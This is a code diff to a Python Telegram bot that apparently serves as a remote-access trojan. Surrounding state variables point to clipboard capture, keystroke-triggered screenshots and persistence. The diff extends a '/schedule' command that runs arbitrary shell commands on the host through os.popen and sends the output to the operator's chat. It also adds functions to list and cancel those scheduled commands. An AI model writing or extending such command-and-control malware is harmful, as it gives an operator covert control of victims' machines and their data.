@@ -44,6 +44,7 @@ network_monitor_active: bool = False
 screenshot_on_key: bool = False
 last_clipboard: str = ""
 persistent_mode: bool = False
+scheduled_timers: list[threading.Timer] = []
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -1393,6 +1394,7 @@ def batteryinfo_command(message: telebot.types.Message) -> None:
 @bot.message_handler(commands=['schedule'])
 @authenticated
 def schedule_command(message: telebot.types.Message) -> None:
+    global scheduled_timers
     parts: list[str] = message.text.split('/schedule', 1)[1].strip().split(' ', 1)
     if len(parts) < 2:
         bot.send_message(message.chat.id, "Usage: /schedule <seconds> <command>")
@@ -1404,25 +1406,48 @@ def schedule_command(message: telebot.types.Message) -> None:
         
         def execute_scheduled():
             result = os.popen(command).read()
-            bot.send_message(message.chat.id, f"Scheduled command result:\n{result[:4000]}")
+            bot.send_message(message.chat.id, f"Scheduled command result:\n{result[:4000] if result else 'Command executed'}")
+            for timer in scheduled_timers[:]:
+                if not timer.is_alive():
+                    scheduled_timers.remove(timer)
         
         timer = threading.Timer(delay, execute_scheduled)
         timer.daemon = True
         timer.start()
+        scheduled_timers.append(timer)
         
-        bot.send_message(message.chat.id, f"Command scheduled in {delay} seconds")
+        bot.send_message(message.chat.id, f"Command scheduled in {delay} seconds (ID: {id(timer)})")
     except ValueError:
         bot.send_message(message.chat.id, "Invalid delay time")
 
 @bot.message_handler(commands=['listschedules'])
 @authenticated
 def list_schedules(message: telebot.types.Message) -> None:
-    bot.send_message(message.chat.id, "Schedule listing feature requires external task storage")
+    global scheduled_timers
+    scheduled_timers = [t for t in scheduled_timers if t.is_alive()]
+    
+    if not scheduled_timers:
+        bot.send_message(message.chat.id, "No active scheduled commands")
+        return
+    
+    response = f"Active schedules ({len(scheduled_timers)}):\n\n"
+    for i, timer in enumerate(scheduled_timers, 1):
+        response += f"{i}. Timer ID: {id(timer)}\n"
+    bot.send_message(message.chat.id, response[:4000])
 
 @bot.message_handler(commands=['clearschedules'])
 @authenticated
 def clear_schedules(message: telebot.types.Message) -> None:
-    bot.send_message(message.chat.id, "Schedule clearing feature requires external task storage")
+    global scheduled_timers
+    count = len([t for t in scheduled_timers if t.is_alive()])
+    
+    for timer in scheduled_timers:
+        if timer.is_alive():
+            timer.cancel()
+    scheduled_timers.clear()
+    
+    bot.send_message(message.chat.id, f"Cancelled {count} scheduled commands")
+
 
 if __name__ == '__main__':
     bot.polling(none_stop=True)
